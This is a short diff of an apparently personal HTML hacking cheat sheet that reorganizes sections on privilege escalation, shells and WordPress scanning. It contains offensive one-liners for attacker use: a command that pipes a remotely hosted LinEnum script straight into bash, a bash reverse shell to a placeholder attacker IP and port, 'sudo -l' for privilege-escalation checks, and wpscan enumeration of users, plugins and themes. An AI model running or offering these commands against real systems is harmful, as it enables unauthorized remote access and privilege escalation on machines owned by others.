@@ -28,14 +28,19 @@ usefull tips and tools for hacking
   <li> curl IP:PORT/LinEnum.sh | bash
 </ul>
 
-
-<b>WPscan</b>
+<b>Priv Esc</b>
 <ul>
-  <li> wpscan -u <URL> -eu -ep -et
+  <li> sudo -l
 </ul>
+
     
 <b>Shell</b>
 <ul>
   <li> wpscan -u URL -eu -ep -et
   <li> bash -c 'bash -i >& /dev/tcp/YOURIP/PORT 0>&1'
+</ul>
+
+<b>WPscan</b>
+<ul>
+  <li> wpscan -u <URL> -eu -ep -et
 </ul>
